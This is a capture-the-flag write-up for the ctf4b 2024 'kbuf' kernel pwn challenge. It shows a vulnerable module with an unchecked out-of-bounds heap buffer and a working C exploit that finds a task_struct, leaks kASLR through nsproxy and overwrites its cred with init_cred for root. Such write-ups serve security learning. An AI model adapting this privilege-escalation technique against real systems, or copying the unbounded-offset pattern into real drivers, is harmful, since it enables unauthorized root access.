# kbuf
<primary-label ref="pwn"/>

ctf4b 2024 pwn

## challenge
```C
#define DEVICE_NAME "kbuf"
#define MEMO_SIZE 0x800

static struct kmem_cache *kbuf_cache = NULL;

static int module_open(struct inode *inode,
                       struct file *filp) {
  filp->private_data = kmem_cache_alloc(kbuf_cache, GFP_KERNEL);
  return filp->private_data ? 0 : -ENOMEM;
}

static ssize_t module_read(struct file *filp, char __user *buf, size_t size, loff_t *pos) {
  if (copy_to_user(buf, filp->private_data + *pos, size))
    return -EINVAL;

  *pos += size;
  return size;
}

static ssize_t module_write(struct file *filp, const char __user *buf, size_t size, loff_t *pos) {
  if (copy_from_user(filp->private_data + *pos, buf, size))
    return -EINVAL;

  *pos += size;
  return size;
}

static loff_t module_lseek(struct file *filp, loff_t offset, int orig) {
  loff_t new_pos = 0;

  switch (orig) {
    case 0: // SEEK_SET
      new_pos = offset;
      break;
    case 1: // SEEK_CUR
      new_pos = filp->f_pos + offset;
      break;
    case 2: // SEEK_END
      new_pos = MEMO_SIZE + offset;
      break;
  }

  return filp->f_pos = new_pos;
}
```
## summary
In this challenge, there's oob vulnerability in heap. Since the size of buffer is `#define MEMO_SIZE 0x800` and there's no restrict to the bound width, I allocated many `task_struct` and found one by the `comm` field, overwrite cred to `init_cred`.

Also, we can easily to bypass kASLR by just leaking `nsproxy` field in the `task_struct`.
## exploit
```c
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define COLOR_RESET   "\033[0m"
#define COLOR_RED     "\033[0;31m"
#define COLOR_GREEN   "\033[0;32m"
#define COLOR_YELLOW  "\033[0;33m"
#define COLOR_BLUE    "\033[0;34m"
#define COLOR_MAGENTA "\033[0;35m"
#define COLOR_CYAN    "\033[0;36m"

#define PROC_NAME "NKTIDKSG"

#define info(fmt, ...) \
    printf(COLOR_CYAN "[*] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

#define success(fmt, ...) \
    printf(COLOR_GREEN "[+] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

#define error(fmt, ...) \
    printf(COLOR_RED "[-] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

#define warning(fmt, ...) \
    printf(COLOR_YELLOW "[!] " fmt COLOR_RESET "\n", ##__VA_ARGS__)

const char *module = "/dev/kbuf";
unsigned long kbase;
unsigned long init_cred;
unsigned long modprobe_path;

void create_task(void) {
    info("create_task");
    for (int i = 0; i < 10; i++) {
        if (fork() == 0) {
            info("fork success");
            sleep(10);
            if (getuid() == 0) {
                success("win");
                system("/bin/ls /root\n");
            }
            exit(1337);
        }
    }
}

void *dump_memory(char *buf) {
    char *p = buf;
    for (int i = -0x100; i < 0x100; i += 0x10) {
        printf("0x%06x |", i);
        printf(" %lx ", *(unsigned long *)(p + i));
        printf(" %lx ", *(unsigned long *)(p + i + 8));
        printf("\n");
    }
}

void *search_memory(int fd, char *str) {
    char buf[0x1000];
    u_int64_t offset;
    for (offset = 0; ; offset += sizeof(buf)) {
        lseek(fd, offset, SEEK_SET);
        if (read(fd, buf, sizeof(buf)) != sizeof(buf)) continue;

        for (size_t j = 0; j < sizeof(buf); j += 0x10) {
            if (memcmp((void *)(buf + j) ,str, strlen(str)) == 0) {
                info("comm: %s @ offset: 0x%lx index: 0x%lx", buf + j, offset , j);
                memcpy(&kbase, buf + j + 0x48, sizeof(unsigned long));
                info("kbase: %lx", kbase);
                kbase = kbase - (0xffffffffaa43dc80 - 0xffffffffa9400000);
                info("kbase: %lx", kbase);
                init_cred = kbase + (0xffffffff9323e060-0xffffffff92200000);
                info("init_cred: %lx", init_cred);
                dump_memory(buf + j);
                char payload[0x10];
                memcpy(payload, &init_cred, 0x8);
                memcpy(payload+8, &init_cred, 0x8);
                lseek(fd, offset+j-0x10, SEEK_SET);
                write(fd, payload, sizeof(payload));

                lseek(fd, offset, SEEK_SET);
                if (read(fd, buf, sizeof(buf)) != sizeof(buf)) continue;
                info("cred overwrite");
                dump_memory(buf + j);
                return (void *)(offset + j - 0x5e0);
            }
        }
    }
}

int init(void) {
    info("init");
    prctl(PR_SET_NAME, PROC_NAME, 0, 0, 0);
    int fd = open(module, O_RDWR);
    if (fd < 0) {
        error("open %s failed", module);
        exit(1);
    }
    return fd;
}

int main(void) {
    int fd = init();
    create_task();
    search_memory(fd, PROC_NAME);
}
```
